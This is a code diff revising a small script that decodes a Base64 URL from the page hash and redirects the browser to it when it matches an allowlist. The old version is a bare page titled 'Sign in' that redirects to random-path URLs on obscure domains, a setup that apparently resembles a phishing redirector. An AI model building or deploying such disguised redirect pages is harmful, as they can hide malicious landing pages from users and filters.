@@ -1,29 +1,49 @@
-<html>
-<head><title>Sign in</title></head>
-<body>
-    <script>
-        // List of allowed domains or paths for redirection
-        const allowedDomains = [
-            'https://vp6u7.mlcros.org/il6jt/84jmm/1tsde/dxtx84/',
-			'https://ciq1.logkln.com/c2ff17/p65h7/zqx0us/0e3kq/',
-        ];
+<script>
+    // List of allowed base domains
+    const allowedDomains = [
+        'https://logwavers.com',
+        'https://sub.logwavers.com',
+    ];
 
-        // Retrieve and decode the hash from the URL
-        const encodedHash = window.location.hash.substr(1); // Remove '#'
+    // Helper function to check if a URL is allowed
+    const isAllowedDomain = (url) => {
         try {
-            // Decode from Base64
-            const decodedUrl = window.atob(encodedHash);
+            const parsedUrl = new URL(url);
             
-            // Check if the decoded URL is allowed
-            if (allowedDomains.includes(decodedUrl)) {
-                // Redirect only if it matches an allowed domain or path
-                window.location.href = decodedUrl;
-            } else {
-                console.warn('Unrecognized or unsafe redirect URL');
-            }
+            // Check if the hostname matches any allowed domains (including subdomains)
+            const isSubdomainAllowed = allowedDomains.some((allowedDomain) => {
+                const allowedBase = new URL(allowedDomain).hostname;
+                return parsedUrl.hostname.endsWith(allowedBase);
+            });
+
+            // Check if the URL matches an allowed base and allows variations (trailing slashes, subfolders)
+            const isUrlPathAllowed = allowedDomains.some((allowedDomain) => {
+                const allowedBase = new URL(allowedDomain);
+                return (
+                    parsedUrl.origin === allowedBase.origin &&
+                    parsedUrl.pathname.startsWith(allowedBase.pathname)
+                );
+            });
+
+            return isSubdomainAllowed && isUrlPathAllowed;
         } catch (error) {
-            console.error('Error decoding the URL:', error);
+            console.error('Invalid URL format:', error);
+            return false;
         }
-    </script> 
-</body>
-</html>
+    };
+
+    // Retrieve and decode the hash from the URL
+    const encodedHash = window.location.hash.substr(1); // Remove '#'
+    try {
+        const decodedUrl = window.atob(encodedHash); // Decode from Base64
+
+        if (isAllowedDomain(decodedUrl)) {
+            // Redirect if the URL is valid
+            window.location.href = decodedUrl;
+        } else {
+            console.warn('Unrecognized or unsafe redirect URL');
+        }
+    } catch (error) {
+        console.error('Error decoding the URL:', error);
+    }
+</script>
